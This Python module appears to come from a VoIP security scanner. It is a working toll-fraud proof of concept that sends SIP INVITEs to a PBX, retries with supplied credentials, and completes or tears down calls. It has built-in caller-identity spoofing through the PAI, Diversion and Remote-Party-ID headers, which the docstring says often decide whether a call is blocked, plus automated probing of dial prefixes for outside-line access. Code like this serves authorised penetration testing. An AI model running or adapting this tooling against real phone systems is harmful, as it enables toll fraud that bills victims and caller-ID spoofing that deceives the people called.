"""Outbound-call proof-of-concept (the toll-fraud demonstration).

Places one INVITE toward the PBX. If the PBX accepts:
  - 401/407  → re-INVITE with digest auth (when creds supplied)
  - 100/180  → ringback (dialplan engaged — already a finding)
  - 200 OK   → ACK, optional SIP-INFO DTMF, BYE (immediate teardown)

No audio is streamed. The whole point is to prove the PBX would carry the
call to a chosen destination — that's the toll-fraud risk demonstration.

Identity-header spoofing (PAI / Diversion / Privacy / RPID / display name)
plus optional SRTP offer are first-class arguments — on Asterisk/FreePBX
deployments these are often the difference between blocked and accepted.
"""
from __future__ import annotations

import socket
import time
from dataclasses import dataclass, field

from . import sip
from .utils import local_ip_for, rand_call_id, rand_tag


@dataclass
class CallResult:
    success: bool                     # reached 200 OK (or 180 in dry_run)
    reached_dialplan: bool             # PBX returned 100/180/183
    status_code: int | None
    reason: str
    evidence: str
    sip_trace: list[str]
    # SRTP outcome: "off" | "offered" | "accepted" | "downgraded" | "required-but-missing"
    srtp_state: str = "off"
    dtmf_digits_sent: list[str] = field(default_factory=list)


def _build_sdp(local_ip: str, rtp_port: int = 49170,
               srtp_offer: str | None = None) -> str:
    proto = "RTP/SAVP" if srtp_offer else "RTP/AVP"
    lines = [
        "v=0",
        f"o=scanner 0 0 IN IP4 {local_ip}",
        "s=voip-scan-poc",
        f"c=IN IP4 {local_ip}",
        "t=0 0",
        f"m=audio {rtp_port} {proto} 0",
        "a=rtpmap:0 PCMU/8000",
        "a=sendrecv",
    ]
    if srtp_offer:
        lines.append(srtp_offer)
    return "\r\n".join(lines) + "\r\n"


def place_call(
    host: str,
    call_to: str,
    call_from: str,
    *,
    port: int = 5060,
    username: str | None = None,
    password: str | None = None,
    timeout: float = 5.0,
    dry_run: bool = False,
    max_wait: float = 10.0,
    traffic_log=None,
    # Identity / spoof primitives
    pai: str | None = None,
    diversion: str | None = None,
    privacy: str | None = None,
    remote_party_id: str | None = None,
    from_display: str | None = None,
    # Network binding
    source_ip: str = "",
    source_port_range: tuple[int, int] | None = None,
    # Media
    srtp: str = "off",       # "off" | "offer" | "require"
    dtmf_digits: str = "",   # e.g. "1p500#" — 'pN' = N-ms pause
) -> CallResult:
    """Place one INVITE; handle 401 re-auth; on 200 OK send ACK then BYE.

    Identity headers, source binding, SRTP, and DTMF are all optional. Default
    behaviour is a plain anonymous-INVITE PoC suitable for FreePBX / Asterisk /
    Grandstream toll-fraud demonstrations.
    """
    local_ip = source_ip or local_ip_for(host)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)

    bound = False
    if source_port_range:
        lo, hi = source_port_range
        for p in range(lo, hi + 1):
            try:
                s.bind((source_ip, p))
                bound = True
                break
            except OSError:
                continue
    if not bound:
        s.bind((source_ip, 0))
    local_port = s.getsockname()[1]

    call_id = rand_call_id()
    tag_from = rand_tag()
    uri = f"sip:{call_to}@{host}"
    trace: list[str] = []

    # ---- SRTP offer (optional) ----
    srtp_offer_line: str | None = None
    srtp_state = "off"
    if srtp.lower() in ("offer", "require"):
        try:
            from . import srtp as _srtp
            mk, ms = _srtp.generate_sdes_key()
            srtp_offer_line = _srtp.sdes_crypto_attribute(1, mk, ms)
            srtp_state = "offered"
            trace.append(f"* SRTP={srtp} — offering AES_CM_128_HMAC_SHA1_80")
        except ImportError as exc:
            if srtp.lower() == "require":
                s.close()
                return CallResult(
                    success=False, reached_dialplan=False, status_code=None,
                    reason="srtp require without crypto backend",
                    evidence=f"--srtp require needs 'cryptography': {exc}",
                    sip_trace=trace,
                )
            trace.append(f"! SRTP offer skipped (no crypto: {exc})")

    identity_kwargs = dict(
        pai=pai, diversion=diversion, privacy=privacy,
        remote_party_id=remote_party_id, from_display=from_display,
    )

    def send(msg: bytes) -> None:
        if traffic_log:
            traffic_log.log("OUT", f"{host}:{port}", msg)
        s.sendto(msg, (host, port))

    def recv_one() -> bytes | None:
        try:
            data, _ = s.recvfrom(65535)
            if traffic_log:
                traffic_log.log("IN", f"{host}:{port}", data)
            return data
        except socket.timeout:
            return None

    # ---- 1) Initial INVITE ----
    invite = sip.build_message(
        "INVITE", uri,
        from_user=call_from, to_user=call_to,
        host=host, port=port,
        local_ip=local_ip, local_port=local_port,
        call_id=call_id, cseq=1, from_tag=tag_from,
        body=_build_sdp(local_ip, srtp_offer=srtp_offer_line),
        **identity_kwargs,
    )
    send(invite)
    trace.append(f"> INVITE sip:{call_to}@{host}")

    deadline = time.monotonic() + max_wait
    final: sip.SipResponse | None = None
    reached_dialplan = False
    last_to_tag: str | None = None
    auth_attempted = False

    try:
        while time.monotonic() < deadline:
            data = recv_one()
            if not data:
                continue
            resp = sip.parse_response(data)
            if not resp:
                continue
            trace.append(f"< {resp.status_code} {resp.reason}")

            # Extract To tag for ACK/BYE routing
            to_hdr = resp.headers.get("to", "")
            if ";tag=" in to_hdr:
                last_to_tag = to_hdr.split(";tag=", 1)[1].split(";")[0] \
                                     .split(",")[0].strip()

            if resp.status_code in (100, 180, 183):
                reached_dialplan = True
                if dry_run and resp.status_code in (180, 183):
                    final = resp
                    break
                continue

            if resp.is_auth_required and not auth_attempted:
                if not (username and password):
                    final = resp
                    break
                auth_attempted = True

                # ACK the 401 (CSeq must match the rejected INVITE)
                try:
                    ack_cseq = int(resp.headers.get("cseq", "1").split()[0])
                except (ValueError, IndexError):
                    ack_cseq = 1
                hdr_name = ("Proxy-Authorization" if resp.status_code == 407
                            else "Authorization")
                auth_header = sip.build_auth_header(
                    username, password, "INVITE", uri,
                    resp.auth_params, header_name=hdr_name,
                )

                ack = sip.build_message(
                    "ACK", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=ack_cseq, from_tag=tag_from,
                    to_tag=last_to_tag,
                )
                send(ack)
                trace.append("> ACK (to 401)")

                invite2 = sip.build_message(
                    "INVITE", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=2, from_tag=tag_from,
                    auth_header=auth_header,
                    body=_build_sdp(local_ip, srtp_offer=srtp_offer_line),
                    **identity_kwargs,
                )
                send(invite2)
                trace.append("> INVITE (auth)")
                continue

            if 200 <= resp.status_code < 300:
                final = resp

                # ---- SRTP answer check ----
                if srtp_offer_line:
                    try:
                        from . import rtp as _rtp
                        answer_media = _rtp.parse_sdp_answer(resp.body or "")
                    except Exception:
                        answer_media = None
                    if answer_media and answer_media.srtp_crypto:
                        srtp_state = "accepted"
                        trace.append("* SRTP accepted — a=crypto honoured")
                    else:
                        srtp_state = ("required-but-missing"
                                      if srtp.lower() == "require"
                                      else "downgraded")
                        trace.append(
                            f"! SRTP {srtp_state} — answer lacked a=crypto"
                        )

                # ---- ACK + optional SIP-INFO DTMF + BYE ----
                try:
                    ack_cseq = int(resp.headers.get("cseq", "1").split()[0])
                except (ValueError, IndexError):
                    ack_cseq = 1
                ack = sip.build_message(
                    "ACK", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=ack_cseq,
                    from_tag=tag_from, to_tag=last_to_tag,
                )
                send(ack)
                trace.append("> ACK")

                dtmf_sent: list[str] = []
                bye_cseq = ack_cseq + 1
                if dtmf_digits:
                    try:
                        from . import dtmf as _dtmf
                        import re as _re
                        tokens = _re.findall(r"p\d+|[0-9*#A-D]", dtmf_digits)
                        info_cseq = ack_cseq + 1
                        for tok in tokens:
                            if tok.startswith("p"):
                                try:
                                    time.sleep(min(int(tok[1:]), 60000) / 1000.0)
                                except ValueError:
                                    pass
                                continue
                            _dtmf.send_sip_info_dtmf(
                                s, (host, port),
                                request_uri=uri,
                                from_uri=f"sip:{call_from}@{host}",
                                to_uri=f"sip:{call_to}@{host}",
                                call_id=call_id, cseq=info_cseq,
                                from_tag=tag_from, to_tag=last_to_tag or "",
                                local_ip=local_ip, local_port=local_port,
                                digit=tok, duration_ms=160,
                            )
                            dtmf_sent.append(tok)
                            trace.append(f"> INFO DTMF={tok}")
                            info_cseq += 1
                            time.sleep(0.1)
                        bye_cseq = info_cseq
                    except Exception as exc:
                        trace.append(f"! SIP-INFO DTMF failed: {exc}")

                bye = sip.build_message(
                    "BYE", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=bye_cseq, from_tag=tag_from,
                    to_tag=last_to_tag,
                )
                send(bye)
                trace.append("> BYE")

                # Smuggle DTMF list onto response for the result builder
                final._dtmf_sent = dtmf_sent  # type: ignore[attr-defined]
                break

            if resp.status_code >= 400:
                final = resp
                break
    finally:
        s.close()

    if not final:
        return CallResult(
            success=False, reached_dialplan=reached_dialplan,
            status_code=None, reason="timeout",
            evidence="no final response before max_wait",
            sip_trace=trace, srtp_state=srtp_state,
        )

    success = (200 <= final.status_code < 300) or (dry_run and reached_dialplan)
    if srtp.lower() == "require" and srtp_state == "required-but-missing":
        success = False

    evidence = f"{final.status_code} {final.reason}"
    if success and dry_run:
        evidence += " (dry-run: dialplan engaged at provisional)"
    elif success:
        evidence += " (200 OK — call established; torn down with BYE)"
    if srtp_state != "off":
        evidence += f" [srtp={srtp_state}]"

    return CallResult(
        success=success,
        reached_dialplan=reached_dialplan,
        status_code=final.status_code,
        reason=final.reason,
        evidence=evidence,
        sip_trace=trace,
        srtp_state=srtp_state,
        dtmf_digits_sent=getattr(final, "_dtmf_sent", []),
    )


# ---------------------------------------------------------------------------
# Dial-plan prefix discovery
# ---------------------------------------------------------------------------

# Common PSTN access prefixes tried in order.
# Empty string = bare E.164 (try first — direct is always cheapest).
DIALPLAN_PREFIXES: list[str] = ["", "9", "0", "00", "+", "1", "011"]


def discover_dialplan_prefix(
    host: str,
    call_to: str,
    call_from: str,
    *,
    port: int = 5060,
    username: str | None = None,
    password: str | None = None,
    timeout: float = 5.0,
    traffic_log=None,
    source_ip: str = "",
    source_port_range: tuple[int, int] | None = None,
    prefixes: list[str] | None = None,
) -> tuple[str | None, str]:
    """Try common dial-plan prefixes until one produces a provisional response.

    Returns (winning_prefix, full_destination) or (None, call_to) if none work.
    The winner is the prefix that caused the PBX to return 100/180/183 — i.e.
    the dialplan routed the call toward the PSTN rather than rejecting it.
    """
    if prefixes is None:
        prefixes = DIALPLAN_PREFIXES

    for prefix in prefixes:
        dest = f"{prefix}{call_to}" if prefix else call_to
        result = place_call(
            host, dest, call_from,
            port=port, username=username, password=password,
            timeout=timeout, dry_run=True, max_wait=timeout + 2.0,
            traffic_log=traffic_log,
            source_ip=source_ip, source_port_range=source_port_range,
        )
        if result.reached_dialplan:
            return prefix, dest

    return None, call_to
